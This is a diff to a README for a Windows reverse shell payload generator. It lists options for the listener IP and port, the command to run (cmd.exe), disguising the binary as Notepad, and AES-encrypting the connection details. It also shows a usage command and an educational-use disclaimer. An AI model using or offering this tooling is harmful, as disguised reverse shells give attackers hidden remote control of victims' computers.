@@ -20,4 +20,24 @@ This tool generates a Windows reverse shell payload with **AES-encrypted IP and 
 ```bash
 python3 payload_gen.py --ip 192.168.1.100 --port 4444 --notepad
 ```
+### Arguments
 
+**--ip** : IP address of the reverse shell listener (required).
+**--port** : TCP port for the connection (default: 49557).
+**--cmd** : Command to execute (default: cmd.exe).
+**--notepad** : Mimic Notepad metadata and icon.
+**--keep** : Keep temporary files (.c, .rc, .res) after building.
+
+---
+
+## Download
+```bash
+git clone
+```
+
+---
+
+## Disclaimer
+
+**This project is provided strictly for educational and ethical security research purposes.
+Unauthorized use against third-party systems is illegal. You are solely responsible for how you use this code.**
